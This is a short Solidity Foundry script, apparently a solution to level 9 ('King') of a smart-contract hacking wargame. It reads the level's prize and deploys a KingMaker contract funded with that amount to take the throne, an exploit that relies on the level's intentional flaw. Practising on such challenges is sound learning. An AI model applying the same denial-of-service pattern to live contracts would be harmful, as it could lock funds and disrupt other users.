// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../instances/Ilevel09.sol";
import "../src/level09.sol";

contract Attacker is Script {
    King level09 = King(payable(0x9BED8AD934C870b0a0ebbf882349631f19468cB8));

    function run() external {
        uint256 prize = level09.prize();

        vm.broadcast();
        (new KingMaker){value: prize}(address(level09));
    }
}
